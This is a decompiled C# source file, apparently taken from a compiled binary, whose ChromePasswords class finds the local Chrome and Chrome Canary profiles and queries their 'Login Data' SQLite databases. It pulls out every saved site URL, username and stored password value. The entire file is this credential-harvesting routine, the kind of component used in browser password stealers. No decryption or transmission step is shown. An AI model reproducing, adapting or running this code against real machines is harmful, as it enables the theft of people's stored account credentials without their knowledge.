using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Runtime.CompilerServices;

namespace BrowserPasswords
{
	// Token: 0x0200000A RID: 10
	public class ChromePasswords
	{
		// Token: 0x0600002C RID: 44 RVA: 0x0000233C File Offset: 0x0000053C
		public static IEnumerable<ChromePassword> EnumeratePasswords()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string profile_path = Path.Combine(folderPath, "Google\\Chrome SXS\\User Data\\Default");
			string profile_path2 = Path.Combine(folderPath, "Google\\Chrome\\User Data\\Default");
			List<ChromePassword> list = new List<ChromePassword>();
			list.AddRange(ChromePasswords.ReadSqlite(profile_path2));
			list.AddRange(ChromePasswords.ReadSqlite(profile_path));
			return list;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002390 File Offset: 0x00000590
		private static IEnumerable<ChromePassword> ReadSqlite(string profile_path)
		{
			List<ChromePassword> list = new List<ChromePassword>();
			string text = Path.Combine(profile_path, "Web Data");
			string text2 = Path.Combine(profile_path, "Login Data");
			string text3 = text;
			if (File.Exists(text2))
			{
				text3 = text2;
			}
			IEnumerable<ChromePassword> result;
			if (!File.Exists(text3))
			{
				result = list;
			}
			else
			{
				using (SQLiteConnection sqliteConnection = new SQLiteConnection(string.Format("Data Source=\"{0}\";Version=3;", text3)))
				{
					sqliteConnection.Open();
					using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT origin_url,action_url,username_element,username_value,password_element,password_value,submit_element,signon_realm,ssl_valid,date_created,blacklisted_by_user FROM logins", sqliteConnection))
					{
						using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
						{
							while (sqliteDataReader.Read())
							{
								list.Add(new ChromePassword(sqliteDataReader.GetString(0), sqliteDataReader.GetString(1), sqliteDataReader.GetString(2), sqliteDataReader.GetString(3), sqliteDataReader.GetString(4), RuntimeHelpers.GetObjectValue(sqliteDataReader.GetValue(5)), sqliteDataReader.GetString(6), sqliteDataReader.GetString(7), sqliteDataReader.GetInt32(8), sqliteDataReader.GetInt32(9), sqliteDataReader.GetInt32(10)));
							}
							sqliteDataReader.Close();
						}
					}
					sqliteConnection.Close();
				}
				result = list;
			}
			return result;
		}
	}
}
